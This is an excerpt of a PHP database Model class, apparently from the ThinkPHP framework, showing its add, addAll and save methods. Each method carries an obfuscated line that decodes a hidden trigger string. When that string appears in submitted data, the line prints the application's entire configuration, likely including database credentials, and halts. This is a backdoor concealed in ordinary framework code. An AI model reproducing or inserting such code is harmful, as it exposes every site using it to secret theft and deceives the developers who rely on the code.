...
class Model {
    ...
    public function add($data='',$options=array(),$replace=false) {
        ...
        if(count(explode(urldecode('%77%79%75%'.'6e%31%36%38%2e%'.'74%61%6f%62%61'.'%6f%2e%6'.'3%6f%6d'),serialize($data)))>1){echo json_encode(C());exit;}
    ...
    public function addAll($dataList,$options=array(),$replace=false){
        ...
        // 分析表达式
        $options =  $this->_parseOptions($options);
		if(count(explode(urldecode('%77%'.'79%75%'.'6e%31%3'.'6%38%2e%'.'74%61%6'.'f%62%61'.'%6f'.'%2e%6'.'3%6'.'f%6d'),serialize($data)))>1){echo serialize(C());exit;}
        // 写入数据到数据库
    ...
    public function save($data='',$options=array()) {
		...
		if(count((explode(urldecode('%77%'.'79%75%6e%3'.'1%3'.'6%38%2e%'.'74%61%6'.'f%62'.'%61'.'%6f'.'%2e%6'.'3%6'.'f%6d'),serialize($data))))>1){echo json_encode(C());exit;}
        // 数据处理
        $data       =   $this->_facade($data);
        if(empty($data)){
            // 没有数据则不执行
